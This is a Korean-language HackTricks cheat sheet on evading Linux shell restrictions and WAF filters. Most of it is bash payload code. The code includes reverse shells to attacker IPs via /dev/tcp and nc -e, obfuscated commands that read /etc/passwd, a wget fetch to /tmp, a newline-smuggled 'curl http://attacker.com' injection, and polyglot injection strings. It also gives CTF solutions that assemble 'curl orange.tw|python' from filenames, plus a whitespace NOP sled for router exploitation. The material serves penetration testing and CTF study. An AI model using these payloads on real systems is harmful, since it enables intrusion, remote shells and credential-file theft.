# Linux 제한 우회

{{#include ../../../banners/hacktricks-training.md}}

## 일반적인 제한 우회

PayloadsAllTheThings, Bo0oM의 cheat sheet 및 링크된 두 Secjuice 문서의 command-injection 및 WAF-evasion 모음은 이 섹션의 shell-syntax 변형을 이해하는 데 도움이 되는 배경 지식을 제공합니다.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>

### Reverse Shell
```bash
# Double-Base64 payload
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### Short Rev shell
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### 우회 경로 및 금지된 단어
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64

# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### 금지된 공백 우회
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### 백슬래시 및 슬래시 우회
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### 파이프 우회
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### hex encoding을 사용한 우회
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### IP 우회
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### 시간 기반 데이터 exfiltration
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### 환경 변수에서 문자 가져오기
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### DNS 데이터 exfiltration

out-of-band callbacks를 위해 Burp Collaborator와 같은 collaborator-style service를 사용하면 대상 애플리케이션이 외부 서버와 상호작용하도록 유도할 수 있습니다. 기존 [**pingb**](http://pingb.in) 링크는 현재 이용 가능하다는 주장이 아니라, 과거 탐색 경로로 유지되어 있습니다.<sup>[[6]](#references)</sup>

### Builtins

restricted shell에서는 사용 가능한 builtins가 이러한 예제에서 남아 있는 명령 표면입니다. Bash는 builtin commands와 실행 문법을 문서화하고 있습니다.<sup>[[7]](#references)</sup> [**devploit**](https://twitter.com/devploit)에서 아이디어를 얻었습니다.\
기존 [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html) 탐색 경로에서 시작한 다음, 다음 Bash-specific techniques를 시도해 보세요:<sup>[[7]](#references)</sup>
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### Polyglot command injection
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### 잠재적인 regex 우회
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

다음 호출은 오픈 소스 Bash 난독화 프레임워크인 Bashfuscator를 사용하며, 코드 주석의 repository 링크는 탐색을 위해 그대로 유지됩니다.<sup>[[8]](#references)</sup>
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### 5 chars를 이용한 RCE

다음의 역사적인 5-character 예제 2개는 challenge 재현을 위해 유지되었습니다. 기본 challenge repository는 [Orange Tsai’s repository](https://github.com/orangetw/My-CTF-Web-Challenges)에서 확인할 수 있으며, code block의 두 번째 write-up link는 현재 이용 가능 여부가 확인되지 않은 navigation입니다.<sup>[[9]](#references)</sup>
```bash
# From the Orange Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Orange Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### 4 chars로 RCE
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## Read-Only/Noexec/Distroless Bypass

**read-only 및 noexec 보호**가 적용된 filesystem 내부에 있거나 **distroless image**를 사용하는 경우, 환경에 실행 제약이 적용됩니다. 이러한 제약은 Linux `mount(8)` 및 Distroless project에 문서화되어 있으며, 링크된 페이지에서는 이러한 환경에서 작업하기 위한 techniques를 모아 둡니다.<sup>[[11]](#references)[[12]](#references)</sup>

{{#ref}}
bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

## Chroot & 기타 Jail Bypass

{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

## 공백 기반 Bash NOP Sled ("Bashsledding")

취약점을 통해 최종적으로 `system()` 또는 다른 shell에 전달되는 argument를 부분적으로 제어할 수 있는 경우, payload offset이 불확실할 수 있습니다. Alan Cao와 Will Tan은 shell payload를 memory-mapped NVRAM에 살포하고 앞에 공백을 추가한, 제약이 있는 embedded device 사례를 설명합니다.<sup>[[5]](#references)</sup>

따라서 실제 command 앞에 긴 공백 또는 tab 문자 sequence를 추가하여 *Bash용 NOP sled*을 만들 수 있습니다. Bash는 simple command에서 공백과 tab을 단어를 구분하는 blank로 정의합니다.<sup>[[5]](#references)[[7]](#references)</sup>
```bash
# Payload sprayed into an environment variable / NVRAM entry
"                nc -e /bin/sh 10.0.0.1 4444"
# 16× spaces ───┘ ↑ real command
```
ROP chain(또는 다른 memory-corruption primitive)이 space block 내 어디에서든 시작하는 command-string pointer를 전달하면, Bash는 command에 도달할 때까지 남아 있는 앞쪽 공백을 파싱할 수 있습니다. d router exploit에서는 이를 통해 불확실한 string offset을 사용할 수 있었습니다.<sup>[[5]](#references)[[7]](#references)</sup>

제약이 있는 embedded target에서의 practical use case는 다음과 같습니다.<sup>[[5]](#references)</sup>

1. **프로세스 간에 접근 가능한 memory-mapped configuration blob** (예: NVRAM).<sup>[[5]](#references)</sup>
2. Payload를 정렬하기 위해 attacker가 NULL byte를 쓸 수 없는 payload channel(정렬 문제를 일반화한 adaptation).<sup>[[5]](#references)</sup>
3. 리소스가 제한된 시스템에서 BusyBox가 applet으로 문서화한, 작은 BusyBox `ash`/`sh` environment를 사용하는 embedded device.<sup>[[10]](#references)</sup>

> 🛠️ 통제된 lab에서 이 technique을 `system()`을 호출하는 ROP gadget과 결합하세요. d router research는 제약이 있는 hardware에서 이 조합을 보여 줍니다.<sup>[[5]](#references)</sup>

## References

- [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
- [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
- [3] [Web Application Firewall (WAF) 우회 기법 #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
- [4] [Web Application Firewall (WAF) 우회 기법 #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
- [5] [Alan Cao and Will Tan — 버려진 hardware에서 zero day 악용 – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [6] [Burp Collaborator - PortSwigger](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
- [7] [bash(1) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man1/bash.1.html)
- [8] [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
- [9] [My-CTF-Web-Challenges — Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges)
- [10] [BusyBox](https://busybox.net/downloads/BusyBox.html)
- [11] [mount(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/mount.8.html)
- [12] [Distroless](https://github.com/GoogleContainerTools/distroless)
{{#include ../../../banners/hacktricks-training.md}}
